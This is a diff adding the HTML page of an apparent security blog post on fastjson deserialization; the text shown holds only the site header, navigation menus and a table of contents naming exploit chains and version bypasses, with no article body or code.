@@ -1,0 +1,2832 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Longlone's Blog about daily and security.">
+      
+      
+      
+        <link rel="canonical" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+      
+      <link rel="icon" href="../../../../attachment/favicon.ico">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.11">
+    
+    
+      
+        <title>fastjson反序列化 - Longlone's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.50e68009.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#7e56c2">
+        
+      
+    
+    
+    
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#fastjson反序列化" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../.." title="Longlone&#39;s Blog" class="md-header__button md-logo" aria-label="Longlone's Blog" data-md-component="logo">
+      
+  <img src="../../../../attachment/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Longlone's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              fastjson反序列化
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Longlone&#39;s Blog" class="md-nav__button md-logo" aria-label="Longlone's Blog" data-md-component="logo">
+      
+  <img src="../../../../attachment/logo.svg" alt="logo">
+
+    </a>
+    Longlone's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/" class="md-nav__link">
+        友情链接
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1">
+          Golang
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Golang" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Golang
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+        第一章-Golang基础
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/" class="md-nav__link">
+        第三章-HTTP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/" class="md-nav__link">
+        第二章-网络连接
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/" class="md-nav__link">
+        第五章-DNS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="md-nav__link">
+        第四章-HTTP服务器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2">
+          Java
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          Java
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_1">
+          JavaWeb安全 文章复现
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JavaWeb安全 文章复现" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          JavaWeb安全 文章复现
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" class="md-nav__link">
+        ClassLoader类加载机制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" class="md-nav__link">
+        java文件系统
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/" class="md-nav__link">
+        JDBC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/" class="md-nav__link">
+        Unsafe
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/" class="md-nav__link">
+        java IO/NIO多种读写文件方式
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        java 文件名空字节截断漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" class="md-nav__link">
+        java反射机制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        java本地命令执行
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/" class="md-nav__link">
+        开头声明
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_2" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_2">
+          Java安全漫谈 文章复现
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java安全漫谈 文章复现" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Java安全漫谈 文章复现
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/RMI%E7%AF%871/" class="md-nav__link">
+        RMI篇1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/RMI%E7%AF%872/" class="md-nav__link">
+        RMI篇2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/RMI%E7%AF%873/" class="md-nav__link">
+        RMI篇3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E7%AF%871/" class="md-nav__link">
+        反射篇1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E7%AF%872/" class="md-nav__link">
+        反射篇2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E7%AF%873/" class="md-nav__link">
+        反射篇3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        反序列化CC篇总结
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/" class="md-nav__link">
+        反序列化CC篇补充
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/" class="md-nav__link">
+        反序列化之CommonsBeanUtils1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/" class="md-nav__link">
+        反序列化篇1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/" class="md-nav__link">
+        反序列化篇2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/" class="md-nav__link">
+        反序列化篇3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/" class="md-nav__link">
+        反序列化篇4
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/" class="md-nav__link">
+        反序列化篇5
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/" class="md-nav__link">
+        反序列化篇6
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/" class="md-nav__link">
+        反序列化篇之JDK7u21
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/" class="md-nav__link">
+        反序列化篇之JDK8u20
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/" class="md-nav__link">
+        开头声明
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" type="checkbox" id="__nav_3_2_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_3">
+          Java安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java安全" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Java安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JNDI/" class="md-nav__link">
+        JNDI与JNDI注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RMI/" class="md-nav__link">
+        RMI
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          fastjson反序列化
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        fastjson反序列化
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fastjson使用" class="md-nav__link">
+    fastjson使用
+  </a>
+  
+    <nav class="md-nav" aria-label="fastjson使用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#第二个问题" class="md-nav__link">
+    第二个问题
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#一些其他注意事项" class="md-nav__link">
+    一些其他注意事项
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fastjson反序列化_1" class="md-nav__link">
+    fastjson反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="fastjson反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#可利用的类" class="md-nav__link">
+    可利用的类
+  </a>
+  
+    <nav class="md-nav" aria-label="可利用的类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#templatesimpl" class="md-nav__link">
+    TemplatesImpl
+  </a>
+  
+    <nav class="md-nav" aria-label="TemplatesImpl">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#smartmatch" class="md-nav__link">
+    smartMatch
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    payload
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jdbcrowsetimpl" class="md-nav__link">
+    JdbcRowSetImpl
+  </a>
+  
+    <nav class="md-nav" aria-label="JdbcRowSetImpl">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#payload_1" class="md-nav__link">
+    payload
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#安全机制与bypass" class="md-nav__link">
+    安全机制与bypass
+  </a>
+  
+    <nav class="md-nav" aria-label="安全机制与bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1225" class="md-nav__link">
+    1.2.25
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2.25">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#未开启autotypesupport" class="md-nav__link">
+    未开启autotypesupport
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#开启autotypesupport" class="md-nav__link">
+    开启autotypesupport
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1225-1241-bypass" class="md-nav__link">
+    1.2.25-1.2.41 bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1242" class="md-nav__link">
+    1.2.42
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2.42">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1225-1242-bypass" class="md-nav__link">
+    1.2.25-1.2.42 bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1243" class="md-nav__link">
+    1.2.43
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2.43">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1225-1243-bypass" class="md-nav__link">
+    1.2.25-1.2.43 bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1244" class="md-nav__link">
+    1.2.44
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2.44">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1225-1244-bypass" class="md-nav__link">
+    1.2.25-1.2.44 bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1244-1247" class="md-nav__link">
+    1.2.44-1.2.47
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2.44-1.2.47">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1247-bypass" class="md-nav__link">
+    &lt;=1.2.47 bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1248-1267" class="md-nav__link">
+    1.2.48-1.2.67
+  </a>
+  
+    <nav class="md-nav" aria-label="1.2.48-1.2.67">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1267-expectclass-bypass" class="md-nav__link">
+    &lt;=1.2.67 expectclass bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1268" class="md-nav__link">
+    1.2.68
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#检测fastjson" class="md-nav__link">
+    检测fastjson
+  </a>
+  
+    <nav class="md-nav" aria-label="检测fastjson">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dnslog" class="md-nav__link">
+    dnslog
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#检测版本" class="md-nav__link">
+    检测版本
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#其他注意事项" class="md-nav__link">
+    其他注意事项
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_4" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_4">
+          Spring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Spring" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          Spring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/AOP/" class="md-nav__link">
+        AOP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/" class="md-nav__link">
+        Bean的作用域
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/" class="md-nav__link">
+        Bean的装配
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/HelloSpring/" class="md-nav__link">
